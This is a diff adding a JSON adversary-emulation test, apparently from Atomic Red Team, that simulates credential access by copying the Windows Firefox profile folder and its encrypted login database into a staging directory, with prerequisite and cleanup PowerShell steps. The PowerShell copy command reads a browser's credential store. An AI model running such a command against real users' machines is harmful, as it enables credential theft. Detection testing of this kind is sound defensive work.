@@ -1,0 +1,36 @@
+{
+    "name": "Simulating access to Windows Firefox Login Data",
+    "description": "Simulates an adversary accessing encrypted credentials from firefox web browser's login database. more info in https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "name": "powershell",
+        "command": "Copy-Item \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\" -Force -Recurse\n",
+        "cleanup_command": "Remove-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Profiles\" -Force -ErrorAction Ignore -Recurse\n",
+        "type": "Command Executor"
+    },
+    "id": "T1555.003",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "Credentials from Web Browsers",
+    "source": "ART",
+    "uuid": "eb8da98a-2e16-4551-b3dd-83de49baa14c",
+    "arguments": null,
+    "preconditions": [
+        {
+            "description": "Firefox must be installed\n",
+            "prereq_command": "if ((Test-Path \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe\")) {exit 0} else {exit 1}",
+            "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nif ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {$url=\"https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=en-US\"}else {$url=\"https://download.mozilla.org/?product=firefox-latest-ssl&os=win&lang=en-US\"}\n$installer = \"PathToAtomicsFolder\\..\\ExternalPayloads\\firefoxsetup.exe\"\n(New-Object Net.WebClient).DownloadFile($url,$installer)\nStart-Process $installer -ArgumentList '/S' -Wait\n"
+        },
+        {
+            "description": "Firefox login data file must exist\n",
+            "prereq_command": "if (Test-Path \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\\") {exit 0} else {exit 1}",
+            "get_prereq_command": "if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {$firefox=\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\"}else {$firefox=\"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe\"}\nStart-Process $firefox -ArgumentList '-CreateProfile Atomic' -Wait\nStart-Process $firefox -NoNewWindow\nStart-Sleep -s 20\nStop-Process -Name firefox\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
